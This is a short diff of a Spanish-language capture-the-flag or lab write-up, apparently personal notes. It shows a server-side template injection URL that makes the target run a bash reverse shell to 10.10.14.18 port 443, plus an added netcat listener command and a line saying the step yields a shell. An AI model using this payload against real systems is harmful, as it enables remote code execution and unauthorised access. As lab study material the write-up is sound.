@@ -139,5 +139,6 @@ Nos quedara algo asi:
 http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.18/443+0>%261"')['read']()+%3d%3d+'chiv'+%25}+a+{%25+endif+%25}
 ```
 
-### nc -lvnp 
+### nc -lvnp 443
+al ejecutar la ruta anterior nos lleva directamente al area de reporte y aqui podemos enviar el test y estando a la escucha nos da una shell
 ![[Pasted image 20240712184542.png]]
